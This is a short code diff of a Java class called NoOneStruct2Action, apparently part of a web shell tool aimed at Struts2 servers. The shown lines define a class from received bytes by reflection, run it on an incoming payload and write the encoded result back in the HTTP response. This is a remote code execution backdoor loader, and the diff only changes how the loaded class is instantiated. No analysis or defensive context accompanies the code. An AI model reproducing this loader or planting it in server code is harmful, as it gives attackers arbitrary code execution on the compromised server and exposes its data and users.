@@ -30,9 +30,8 @@ public class NoOneStruct2Action {
                         coreClass = reflectionDefineClass(bytes);
                     }
                     ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-                    Object httpChannelCore = coreClass.getConstructor(Object.class).newInstance(this);
+                    Object httpChannelCore = coreClass.newInstance();
                     httpChannelCore.equals(new Object[]{payload, outputStream});
-                    httpChannelCore.toString();
                     ServletOutputStream responseOutputStream = response.getOutputStream();
                     byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
                     responseOutputStream.write(data);
